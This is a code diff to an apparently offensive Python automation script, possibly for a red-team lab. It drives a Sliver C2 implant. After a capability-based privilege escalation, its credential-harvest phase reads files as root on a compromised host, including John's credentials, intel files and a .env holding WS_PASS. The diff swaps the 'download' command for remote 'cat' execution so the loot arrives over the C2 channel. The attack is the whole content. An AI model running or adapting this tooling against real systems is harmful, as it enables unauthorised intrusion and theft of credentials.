@@ -201,7 +201,12 @@ def subphase_capability_privesc(sliver_session_id: str, cap_binary: str,
 
 
 def subphase_harvest_creds(root_session_id: str, scratch_dir: Path) -> dict:
-    """Sub-phase B: as root via the new session, pull John's creds + intel files."""
+    """Sub-phase B: as root via the new session, pull John's creds + intel files.
+
+    Note: In Beacon C2 mode, standard 'download' command triggers an interactive 
+    TTY prompt during 'tasks fetch', causing subprocess commands to block and time out.
+    We bypass this by executing 'cat' remotely and writing the returned stdout to disk.
+    """
     log("\n=== Sub-phase B: credential harvest as root ===")
     loot_dir = scratch_dir / "downloads"
     loot_dir.mkdir(parents=True, exist_ok=True)
@@ -210,23 +215,25 @@ def subphase_harvest_creds(root_session_id: str, scratch_dir: Path) -> dict:
     for remote_path in HARVEST_PATHS:
         local_name = Path(remote_path).name
         local_target = loot_dir / local_name
-        log(f"[*] sliver: download {remote_path} -> {local_target}")
-        sliver_exec(
+        log(f"[*] sliver: cat {remote_path} -> {local_target}")
+        
+        # Execute cat remotely and capture stdout
+        file_content = sliver_exec(
             root_session_id,
-            f"download {remote_path} {local_target}",
-            timeout=20,
+            f"execute -o -- cat {remote_path}",
+            timeout=45,
         )
-        if local_target.is_file():
+        
+        if file_content:
             try:
-                files[remote_path] = local_target.read_text(
-                    encoding="utf-8", errors="replace"
-                )
+                local_target.write_text(file_content, encoding="utf-8")
+                files[remote_path] = file_content
                 log(f"[+] harvested {remote_path}  ({local_target.stat().st_size} bytes)")
             except Exception as e:
-                log(f"[-] could not read local {local_target}: {e}")
+                log(f"[-] could not write local {local_target}: {e}")
                 files[remote_path] = None
         else:
-            log(f"[-] download produced no local file at {local_target}")
+            log(f"[-] read produced no content for {remote_path}")
             files[remote_path] = None
 
     # Extract the WS_PASS=value from the .env if it landed.
